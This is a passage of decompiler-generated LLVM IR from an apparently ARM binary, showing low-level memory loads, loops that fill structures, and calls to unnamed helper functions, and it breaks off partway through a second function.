dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a120, %.dec_label_pc_a0fc_crit_edge, %dec_label_pc_a0f0, %dec_label_pc_a114, %dec_label_pc_a104, %dec_label_pc_a0d8
  %v29_a100 = phi i32 [ %v29_a100.pre, %.dec_label_pc_a0fc_crit_edge ], [ %v0_a0e8, %dec_label_pc_a120 ], [ %v0_a0e8, %dec_label_pc_a0f0 ], [ %v0_a0e8, %dec_label_pc_a114 ], [ %v0_a0e8, %dec_label_pc_a104 ], [ %v0_a0e8, %dec_label_pc_a0d8 ]
  store i32 %v9_a0d8, i32* @r6, align 4
  store i32 %v12_a0d8, i32* @r7, align 4
  store i32 %v18_a0d8, i32* @sb, align 4
  store i32 %v21_a0d8, i32* @sl, align 4
  ret i32 %v29_a100

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0f0
  %v7_a104 = icmp eq i32 %arg2, 5
  store i1 %v7_a104, i1* %cpsr_z.global-to-local, align 1
  %v1_a108 = add i32 %v0_a0e8, 4
  %v2_a108 = inttoptr i32 %v1_a108 to i8*
  %v3_a108 = load i8, i8* %v2_a108, align 1
  %v4_a108 = zext i8 %v3_a108 to i32
  store i32 %v4_a108, i32* %r1.global-to-local, align 4
  br i1 %v7_a104, label %dec_label_pc_a0fc, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a104
  %v1_a114 = add i32 %v0_a0e8, 5
  %v2_a114 = inttoptr i32 %v1_a114 to i8*
  %v3_a114 = load i8, i8* %v2_a114, align 1
  %v4_a114 = zext i8 %v3_a114 to i32
  store i32 %v4_a114, i32* @r7, align 4
  %v2_a118 = icmp eq i8 %v3_a114, 0
  store i1 %v2_a118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a118, label %dec_label_pc_a0fc, label %dec_label_pc_a120

dec_label_pc_a120:                                ; preds = %dec_label_pc_a114
  %v3_a120 = mul nuw nsw i32 %v4_a114, 4
  store i32 %v3_a120, i32* @sb, align 4
  %v1_a124 = add i32 %arg2, -6
  store i32 %v1_a124, i32* @r6, align 4
  %v2_a128 = mul nuw nsw i32 %v4_a114, 5
  store i32 %v2_a128, i32* @r8, align 4
  %v3_a12c = icmp ult i32 %v1_a124, %v2_a128
  %v9_a12c = icmp eq i32 %v1_a124, %v2_a128
  store i1 %v9_a12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a12c, label %dec_label_pc_a0fc, label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a120
  store i32 %v4_a114, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_a13c = call i32 @function_13a94(i32 %v4_a114, i32 24)
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  %v0_a140 = load i32, i32* @r7, align 4
  %v2_a140 = icmp eq i32 %v0_a140, 0
  store i1 %v2_a140, i1* %cpsr_z.global-to-local, align 1
  %v0_a148 = load i32, i32* @r4, align 4
  %v1_a148 = add i32 %v0_a148, 6
  store i32 %v1_a148, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_a140, 1
  br i1 %tmp27, label %dec_label_pc_a1a0thread-pre-split, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a134
  store i32 %v2_a13c, i32* %r1.global-to-local, align 4
  %v1_a154 = load i32, i32* @r8, align 4
  %v2_a154 = add i32 %v1_a154, %v0_a148
  store i32 %v2_a154, i32* %ip.global-to-local, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_a164

dec_label_pc_a164:                                ; preds = %dec_label_pc_a164.dec_label_pc_a164_crit_edge, %dec_label_pc_a150
  %v2_a174 = phi i32 [ %v1_a188, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v2_a13c, %dec_label_pc_a150 ]
  %v0_a170 = phi i32 [ %v0_a170.pre, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v2_a154, %dec_label_pc_a150 ]
  %v0_a16c = phi i32 [ %v0_a164.pre, %dec_label_pc_a164.dec_label_pc_a164_crit_edge ], [ %v0_a148, %dec_label_pc_a150 ]
  %v1_a164 = add i32 %v0_a16c, 10
  %v2_a164 = inttoptr i32 %v1_a164 to i8*
  %v3_a164 = load i8, i8* %v2_a164, align 1
  %v1_a168 = add i32 %v0_a16c, 6
  %v2_a168 = inttoptr i32 %v1_a168 to i32*
  %v3_a168 = load i32, i32* %v2_a168, align 4
  store i32 %v3_a168, i32* %r2.global-to-local, align 4
  %v1_a16c = add i32 %v0_a16c, 5
  store i32 %v1_a16c, i32* %r0.global-to-local, align 4
  %v9_a170 = icmp eq i32 %v0_a170, %v1_a16c
  store i1 %v9_a170, i1* %cpsr_z.global-to-local, align 1
  %v3_a174 = add i32 %v2_a174, 20
  %v4_a174 = inttoptr i32 %v3_a174 to i8*
  store i8 %v3_a164, i8* %v4_a174, align 1
  %v0_a178 = load i32, i32* %r2.global-to-local, align 4
  %v1_a178 = load i32, i32* %r1.global-to-local, align 4
  %v2_a178 = add i32 %v1_a178, 4
  %v3_a178 = inttoptr i32 %v2_a178 to i32*
  store i32 %v0_a178, i32* %v3_a178, align 4
  %v0_a17c = load i32, i32* %r2.global-to-local, align 4
  %v1_a17c = load i32, i32* %r1.global-to-local, align 4
  %v2_a17c = add i32 %v1_a17c, 16
  %v3_a17c = inttoptr i32 %v2_a17c to i32*
  store i32 %v0_a17c, i32* %v3_a17c, align 4
  %v0_a180 = load i32, i32* @r4, align 4
  %v1_a180 = trunc i32 %v0_a180 to i8
  %v2_a180 = load i32, i32* %r1.global-to-local, align 4
  %v3_a180 = inttoptr i32 %v2_a180 to i8*
  store i8 %v1_a180, i8* %v3_a180, align 1
  %v0_a184 = load i32, i32* @lr, align 4
  %v1_a184 = trunc i32 %v0_a184 to i8
  %v2_a184 = load i32, i32* %r1.global-to-local, align 4
  %v3_a184 = add i32 %v2_a184, 1
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v1_a184, i8* %v4_a184, align 1
  %v0_a188 = load i32, i32* %r1.global-to-local, align 4
  %v1_a188 = add i32 %v0_a188, 24
  store i32 %v1_a188, i32* %r1.global-to-local, align 4
  %v0_a18c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a18c, label %dec_label_pc_a190, label %dec_label_pc_a164.dec_label_pc_a164_crit_edge

dec_label_pc_a164.dec_label_pc_a164_crit_edge:    ; preds = %dec_label_pc_a164
  %v0_a164.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_a170.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a164

dec_label_pc_a190:                                ; preds = %dec_label_pc_a164
  %v0_a190 = load i32, i32* @sb, align 4
  %v1_a190 = load i32, i32* @r7, align 4
  %v1_a194 = load i32, i32* @r5, align 4
  %sum = add i32 %v1_a190, %v0_a190
  %v2_a194 = sub i32 %v1_a194, %sum
  %v0_a198 = load i32, i32* %r0.global-to-local, align 4
  %v1_a198 = add i32 %v0_a198, 6
  store i32 %v1_a198, i32* %fp.global-to-local, align 4
  %v1_a19c = add i32 %v2_a194, -6
  store i32 %v1_a19c, i32* @r6, align 4
  br label %dec_label_pc_a1a0

dec_label_pc_a1a0thread-pre-split:                ; preds = %dec_label_pc_a134
  %v0_a1a0.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1a0

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a1a0thread-pre-split, %dec_label_pc_a190
  %v0_a1ac = phi i32 [ %v1_a148, %dec_label_pc_a1a0thread-pre-split ], [ %v1_a198, %dec_label_pc_a190 ]
  %v1_a1a4 = phi i32 [ %v0_a1a0.pr, %dec_label_pc_a1a0thread-pre-split ], [ %v1_a19c, %dec_label_pc_a190 ]
  %v2_a1a0 = icmp eq i32 %v1_a1a4, 0
  store i1 %v2_a1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a0, label %dec_label_pc_a2d8, label %dec_label_pc_a1ac

dec_label_pc_a1ac:                                ; preds = %dec_label_pc_a1a0
  %v1_a1ac = inttoptr i32 %v0_a1ac to i8*
  %v2_a1ac = load i8, i8* %v1_a1ac, align 1
  %v3_a1ac = zext i8 %v2_a1ac to i32
  store i32 %v3_a1ac, i32* @sb, align 4
  %v2_a1b0 = icmp eq i8 %v2_a1ac, 0
  store i1 %v2_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1b0, label %dec_label_pc_a290, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a1ac
  store i32 %v3_a1ac, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a1c8 = call i32 @function_13a94(i32 %v3_a1ac, i32 8)
  store i32 %v2_a1c8, i32* %r0.global-to-local, align 4
  %v0_a1cc = load i32, i32* @sb, align 4
  %v2_a1cc = icmp eq i32 %v0_a1cc, 0
  store i1 %v2_a1cc, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_a1cc, 1
  br i1 %tmp28, label %dec_label_pc_a290, label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a1c0
  %v0_a1dc = load i32, i32* @r6, align 4
  %v1_a1dc = add i32 %v0_a1dc, -1
  store i32 %v1_a1dc, i32* %r2.global-to-local, align 4
  %v7_a1dc = icmp eq i32 %v0_a1dc, 1
  store i1 %v7_a1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1dc, label %dec_label_pc_a2d8, label %dec_label_pc_a1e4

dec_label_pc_a1e4:                                ; preds = %dec_label_pc_a1dc
  %v0_a1e4 = load i32, i32* %fp.global-to-local, align 4
  %v1_a1e4 = add i32 %v0_a1e4, 1
  %v2_a1e4 = inttoptr i32 %v1_a1e4 to i8*
  %v3_a1e4 = load i8, i8* %v2_a1e4, align 1
  %v1_a1e8 = add i32 %v0_a1dc, -2
  store i32 %v1_a1e8, i32* %r2.global-to-local, align 4
  %v7_a1e8 = icmp eq i32 %v1_a1dc, 1
  store i1 %v7_a1e8, i1* %cpsr_z.global-to-local, align 1
  %v3_a1ec = add i32 %v2_a1c8, 4
  %v4_a1ec = inttoptr i32 %v3_a1ec to i8*
  store i8 %v3_a1e4, i8* %v4_a1ec, align 1
  %v0_a1f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_a1f0 = add i32 %v0_a1f0, 1
  store i32 %v1_a1f0, i32* %r0.global-to-local, align 4
  %v0_a1f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f4, label %dec_label_pc_a2d8, label %dec_label_pc_a1f8

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1e4
  %v1_a1f8 = add i32 %v0_a1f0, 2
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i8*
  %v3_a1f8 = load i8, i8* %v2_a1f8, align 1
  %v4_a1f8 = zext i8 %v3_a1f8 to i32
  store i32 %v4_a1f8, i32* @r4, align 4
  %v0_a1fc = load i32, i32* %r2.global-to-local, align 4
  %v1_a1fc = add i32 %v0_a1fc, -1
  store i32 %v1_a1fc, i32* @r8, align 4
  %v9_a200 = icmp eq i32 %v1_a1fc, %v4_a1f8
  store i1 %v9_a200, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1f8, i32* %r0.global-to-local, align 4
  %v5_a208 = icmp slt i32 %v1_a1fc, %v4_a1f8
  br i1 %v5_a208, label %dec_label_pc_a2d8, label %dec_label_pc_a20c

dec_label_pc_a20c:                                ; preds = %dec_label_pc_a1f8
  store i32 %v2_a1c8, i32* @r5, align 4
  %v1_a214 = add i32 %v2_a1c8, 8
  %v1_a218 = add i32 %v0_a1f0, 3
  store i32 %v1_a218, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_a25c

dec_label_pc_a228:                                ; preds = %dec_label_pc_a25c
  %v0_a228 = load i32, i32* @r8, align 4
  %v1_a228 = load i32, i32* @r4, align 4
  %v2_a228 = sub i32 %v0_a228, %v1_a228
  store i32 %v2_a228, i32* %r2.global-to-local, align 4
  %v9_a228 = icmp eq i32 %v0_a228, %v1_a228
  store i1 %v9_a228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a228, label %dec_label_pc_a2d8, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a228
  %v1_a230 = load i32, i32* @r6, align 4
  %v2_a230 = add i32 %v1_a230, %v1_a228
  %v3_a230 = inttoptr i32 %v2_a230 to i8*
  %v4_a230 = load i8, i8* %v3_a230, align 1
  store i32 %v2_a230, i32* %r0.global-to-local, align 4
  %v1_a238 = add i32 %v2_a228, -1
  store i32 %v1_a238, i32* %r2.global-to-local, align 4
  %v7_a238 = icmp eq i32 %v2_a228, 1
  store i1 %v7_a238, i1* %cpsr_z.global-to-local, align 1
  %v3_a23c = add i32 %v2_a23c, 4
  %v4_a23c = inttoptr i32 %v3_a23c to i8*
  store i8 %v4_a230, i8* %v4_a23c, align 1
  %v0_a240 = load i32, i32* %r0.global-to-local, align 4
  %v0_a244 = load i32, i32* %r2.global-to-local, align 4
  %v1_a244 = add i32 %v0_a244, -1
  store i32 %v1_a244, i32* @r8, align 4
  %v1_a248 = add i32 %v0_a240, 2
  store i32 %v1_a248, i32* @r6, align 4
  %v0_a24c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a24c, label %dec_label_pc_a2d8, label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a230
  %v1_a240 = add i32 %v0_a240, 1
  %v2_a250 = inttoptr i32 %v1_a240 to i8*
  %v3_a250 = load i8, i8* %v2_a250, align 1
  %v4_a250 = zext i8 %v3_a250 to i32
  store i32 %v4_a250, i32* @r4, align 4
  %v2_a254 = sub i32 %v1_a244, %v4_a250
  %tmp30 = sub i32 0, %v2_a254
  %v6_a254 = and i32 %v1_a244, %tmp30
  %v7_a254 = icmp slt i32 %v6_a254, 0
  %v8_a254 = icmp slt i32 %v2_a254, 0
  %v9_a254 = icmp eq i32 %v1_a244, %v4_a250
  store i1 %v9_a254, i1* %cpsr_z.global-to-local, align 1
  %v2_a258 = xor i1 %v8_a254, %v7_a254
  br i1 %v2_a258, label %dec_label_pc_a2d8, label %dec_label_pc_a25c

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a250, %dec_label_pc_a20c
  %v0_a260 = phi i32 [ %v4_a1f8, %dec_label_pc_a20c ], [ %v4_a250, %dec_label_pc_a250 ]
  %v2_a23c = phi i32 [ %v1_a214, %dec_label_pc_a20c ], [ %v1_a280, %dec_label_pc_a250 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a260 = add nuw nsw i32 %v0_a260, 1
  store i32 %v1_a260, i32* %r0.global-to-local, align 4
  %v2_a264 = call i32 @function_13a94(i32 %v1_a260, i32 1)
  store i32 %v2_a264, i32* %r0.global-to-local, align 4
  %v0_a268 = load i32, i32* @r6, align 4
  store i32 %v0_a268, i32* %r1.global-to-local, align 4
  %v1_a26c = load i32, i32* @r5, align 4
  %v2_a26c = inttoptr i32 %v1_a26c to i32*
  store i32 %v2_a264, i32* %v2_a26c, align 4
  %v0_a270 = load i32, i32* @r4, align 4
  store i32 %v0_a270, i32* %r2.global-to-local, align 4
  %v3_a274 = call i32 @function_12558(i32 %v2_a264, i32 %v0_a268, i32 %v0_a270)
  store i32 %v3_a274, i32* %r0.global-to-local, align 4
  store i32 %v2_a23c, i32* @r5, align 4
  %v0_a27c = load i32, i32* %fp.global-to-local, align 4
  %v1_a27c = add i32 %v0_a27c, 1
  store i32 %v1_a27c, i32* %fp.global-to-local, align 4
  %v1_a280 = add i32 %v2_a23c, 8
  store i32 %v1_a280, i32* %ip.global-to-local, align 4
  %v1_a284 = load i32, i32* @sb, align 4
  %v9_a284 = icmp eq i32 %v1_a27c, %v1_a284
  store i1 %v9_a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a284, label %dec_label_pc_a290, label %dec_label_pc_a228

dec_label_pc_a290:                                ; preds = %dec_label_pc_a25c, %dec_label_pc_a1c0, %dec_label_pc_a1ac
  %stack_var_-48.1 = phi i32 [ %v3_a1ac, %dec_label_pc_a1ac ], [ %v0_a1cc, %dec_label_pc_a1c0 ], [ %v0_a1cc, %dec_label_pc_a25c ]
  %stack_var_-52.2 = phi i32 [ %v3_a1ac, %dec_label_pc_a1ac ], [ %v2_a1c8, %dec_label_pc_a1c0 ], [ %v2_a1c8, %dec_label_pc_a25c ]
  %v0_a290 = call i32 @function_13470()
  %v0_a294 = load i32, i32* @sl, align 4
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_a2a0 = mul i32 %v0_a294, 16777216
  %v1_a294 = mul i32 %v0_a294, 256
  %v4_a2a4 = and i32 %v1_a294, 16711680
  %v5_a2a4 = or i32 %v4_a2a4, %v3_a2a0
  store i32 %v5_a2a4, i32* %r1.global-to-local, align 4
  %v1_a29c = udiv i32 %v0_a294, 256
  %v3_a2a8 = and i32 %v1_a29c, 65280
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  %v2_a2b0 = inttoptr i32 %v0_a290 to i32*
  store i32 0, i32* %v2_a2b0, align 4
  %v0_a2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2b4 = load i32, i32* @sl, align 4
  %v4_a2b4 = udiv i32 %v1_a2b4, 16777216
  %v5_a2b4 = or i32 %v4_a2b4, %v0_a2b4
  %v0_a2b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* @ip, align 4
  %v1_a2c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a2c0 = or i32 %v5_a2b4, %v1_a2c0
  store i32 %v2_a2c0, i32* %r0.global-to-local, align 4
  store i32 %v4_a108, i32* %r1.global-to-local, align 4
  %v0_a2cc = load i32, i32* @r7, align 4
  store i32 %v0_a2cc, i32* %r2.global-to-local, align 4
  %v6_a2d4 = trunc i32 %v0_a2b8 to i8
  %v7_a2d4 = call i32 @function_9fe8(i32 %v2_a2c0, i32 %v4_a108, i32 %v0_a2cc, i32 %v2_a13c, i8 %v6_a2d4, i32 %stack_var_-52.2)
  store i32 %v7_a2d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a2d8

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a250, %dec_label_pc_a230, %dec_label_pc_a228, %dec_label_pc_a1f8, %dec_label_pc_a1e4, %dec_label_pc_a1dc, %dec_label_pc_a1a0, %dec_label_pc_a290
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_a1a0 ], [ %stack_var_-52.2, %dec_label_pc_a290 ], [ %v2_a1c8, %dec_label_pc_a1dc ], [ %v2_a1c8, %dec_label_pc_a1e4 ], [ %v2_a1c8, %dec_label_pc_a1f8 ], [ %v2_a1c8, %dec_label_pc_a228 ], [ %v2_a1c8, %dec_label_pc_a230 ], [ %v2_a1c8, %dec_label_pc_a250 ]
  store i32 %v2_a13c, i32* %r1.global-to-local, align 4
  %v2_a2dc = icmp eq i32 %v2_a13c, 0
  store i1 %v2_a2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2dc, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_a2d8
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_a2d8, %bb
  %v1_a2e4 = xor i1 %v2_a2dc, true
  call void @__pseudo_cond_branch(i1 %v1_a2e4, i32 ptrtoint (i32* @global_var_13aec.59 to i32))
  %v2_a2ec = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_a2ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2ec, label %.dec_label_pc_a0fc_crit_edge, label %dec_label_pc_a2f4

.dec_label_pc_a0fc_crit_edge:                     ; preds = %bb31
  %v29_a100.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0fc

dec_label_pc_a2f4:                                ; preds = %bb31
  %v0_a2f4 = load i32, i32* @sb, align 4
  %v2_a2f4 = icmp eq i32 %v0_a2f4, 0
  store i1 %v2_a2f4, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_a2f4, 1
  br i1 %tmp32, label %dec_label_pc_a31c, label %dec_label_pc_a2fc

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2f4
  br label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a2fc
  %v0_a30c = phi i32 [ %v1_a30c, %dec_label_pc_a300 ], [ 0, %dec_label_pc_a2fc ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_a304 = mul i32 %v0_a30c, 8
  %v5_a304 = add i32 %v4_a304, %stack_var_-52.3
  %v6_a304 = inttoptr i32 %v5_a304 to i32*
  %v7_a304 = load i32, i32* %v6_a304, align 4
  store i32 %v7_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = icmp eq i32 %v7_a304, 0
  store i1 %v2_a308, i1* %cpsr_z.global-to-local, align 1
  %v1_a30c = add i32 %v0_a30c, 1
  %v1_a310 = xor i1 %v2_a308, true
  call void @__pseudo_cond_branch(i1 %v1_a310, i32 ptrtoint (i32* @global_var_13aec.59 to i32))
  %v0_a314 = load i32, i32* @sb, align 4
  %v9_a314 = icmp eq i32 %v0_a314, %v1_a30c
  store i1 %v9_a314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a314, label %dec_label_pc_a31c, label %dec_label_pc_a300

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a2f4
  store i32 %stack_var_-52.3, i32* @r0, align 4
  store i32 %v3_a0d8, i32* @r4, align 4
  store i32 %v6_a0d8, i32* @r5, align 4
  store i32 %v9_a0d8, i32* @r6, align 4
  store i32 %v12_a0d8, i32* @r7, align 4
  store i32 %v15_a0d8, i32* @r8, align 4
  store i32 %v18_a0d8, i32* @sb, align 4
  store i32 %v21_a0d8, i32* @sl, align 4
  store i32 %v27_a0d8, i32* @lr, align 4
  %v0_a328 = call i32 @function_13aec()
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  ret i32 %v0_a328

; uselistorder directives
  uselistorder i32 %stack_var_-52.3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a294, { 2, 0, 1 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_a280, { 1, 0 }
  uselistorder i32 %v2_a23c, { 2, 1, 0 }
  uselistorder i32 %v2_a254, { 1, 0 }
  uselistorder i32 %v4_a250, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a244, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a240, { 1, 0 }
  uselistorder i32 %v0_a1dc, { 0, 2, 1 }
  uselistorder i32 %v0_a1cc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a1c8, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_a1ac, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_a188, { 1, 0 }
  uselistorder i32 %v0_a16c, { 0, 2, 1 }
  uselistorder i32 %v0_a148, { 1, 2, 0, 3 }
  uselistorder i32 %v2_a13c, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder i32 %v2_a128, { 2, 1, 0 }
  uselistorder i32 %v4_a114, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_a108, { 1, 0, 2 }
  uselistorder i32 %v0_a0e8, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 21, 4, 22, 5, 8, 12, 9, 6, 7, 10, 11, 18, 13, 15, 14, 16, 17, 20, 19, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_a2d8, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a0fc, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_a32c(i32 %arg1) local_unnamed_addr {
dec_label_pc_a32c:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_a32c = load i32, i32* @r4, align 4
  store i32 %v3_a32c, i32* %stack_var_-12, align 4
  %v6_a32c = load i32, i32* @r5, align 4
  %v9_a32c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1e3b8.61 to i32), i32* @r4, align 4
  %v2_a334 = load i32, i32* @global_var_1e3b8.61, align 4
  store i32 %v2_a334, i32* %r0.global-to-local, align 4
  %v2_a338 = icmp eq i32 %v2_a334, 0
  br i1 %v2_a338, label %dec_label_pc_a340, label %dec_label_pc_a3c0

dec_label_pc_a340:                                ; preds = %dec_label_pc_a32c
  %v3_a340 = load i32, i32* @global_var_1e3bc.62, align 4
  store i32 %v3_a340, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_a348 = icmp eq i32 %v3_a340, 0
  store i32 0, i32* @global_var_1e3b8.61, align 4
  br i1 %v2_a348, label %dec_label_pc_a354, label %dec_label_pc_a3dc

dec_label_pc_a354:                                ; preds = %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge, %dec_label_pc_a340
  %v0_a35c = phi i32 [ %v0_a35c.pre, %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge ], [ 0, %dec_label_pc_a340 ]
  %v1_a35c = phi i32 [ %v0_a354.pre, %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge ], [ ptrtoint (i32* @global_var_1e3b8.61 to i32), %dec_label_pc_a340 ]
  %v1_a354 = add i32 %v1_a35c, 8
  %v2_a354 = inttoptr i32 %v1_a354 to i32*
  %v3_a354 = load i32, i32* %v2_a354, align 4
  store i32 %v3_a354, i32* %r0.global-to-local, align 4
  %v2_a358 = icmp eq i32 %v3_a354, 0
  %v2_a35c = add i32 %v1_a35c, 4
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v0_a35c, i32* %v3_a35c, align 4
  br i1 %v2_a358, label %dec_label_pc_a364, label %dec_label_pc_a3f4

dec_label_pc_a364:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a3dc
  %v0_a364 = load i32, i32* @r4, align 4
  %v1_a364 = add i32 %v0_a364, 12
  %v2_a364 = inttoptr i32 %v1_a364 to i32*
  %v3_a364 = load i32, i32* %v2_a364, align 4
  store i32 %v3_a364, i32* %r0.global-to-local, align 4
  %v2_a368 = icmp eq i32 %v3_a364, 0
  %v0_a36c = load i32, i32* %r5.global-to-local, align 4
  %v2_a36c = add i32 %v0_a364, 8
  %v3_a36c = inttoptr i32 %v2_a36c to i32*
  store i32 %v0_a36c, i32* %v3_a36c, align 4
  br i1 %v2_a368, label %dec_label_pc_a374, label %dec_label_pc_a40c

dec_label_pc_a374:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a3f4
  %v0_a374 = load i32, i32* @r4, align 4
  %v1_a374 = add i32 %v0_a374, 16
  %v2_a374 = inttoptr i32 %v1_a374 to i32*
  %v3_a374 = load i32, i32* %v2_a374, align 4
  store i32 %v3_a374, i32* %r0.global-to-local, align 4
  %v2_a378 = icmp eq i32 %v3_a374, 0
  %v0_a37c = load i32, i32* %r5.global-to-local, align 4
  %v2_a37c = add i32 %v0_a374, 12
  %v3_a37c = inttoptr i32 %v2_a37c to i32*
  store i32 %v0_a37c, i32* %v3_a37c, align 4
  br i1 %v2_a378, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a384:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a40c
  %v0_a384 = load i32, i32* @r4, align 4
  %v1_a384 = add i32 %v0_a384, 20
  %v2_a384 = inttoptr i32 %v1_a384 to i32*
  %v3_a384 = load i32, i32* %v2_a384, align 4
  store i32 %v3_a384, i32* %r0.global-to-local, align 4
  %v2_a388 = icmp eq i32 %v3_a384, 0
  %v0_a38c = load i32, i32* %r5.global-to-local, align 4
  %v2_a38c = add i32 %v0_a384, 16
  %v3_a38c = inttoptr i32 %v2_a38c to i32*
  store i32 %v0_a38c, i32* %v3_a38c, align 4
  br i1 %v2_a388, label %dec_label_pc_a394, label %dec_label_pc_a43c

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a424
  %v0_a394 = load i32, i32* @r4, align 4
  %v1_a394 = add i32 %v0_a394, 24
  %v2_a394 = inttoptr i32 %v1_a394 to i32*
  %v3_a394 = load i32, i32* %v2_a394, align 4
  store i32 %v3_a394, i32* %r0.global-to-local, align 4
  %v2_a398 = icmp eq i32 %v3_a394, 0
  %v0_a39c = load i32, i32* %r5.global-to-local, align 4
  %v2_a39c = add i32 %v0_a394, 20
  %v3_a39c = inttoptr i32 %v2_a39c to i32*
  store i32 %v0_a39c, i32* %v3_a39c, align 4
  br i1 %v2_a398, label %dec_label_pc_a3a4, label %dec_label_pc_a454

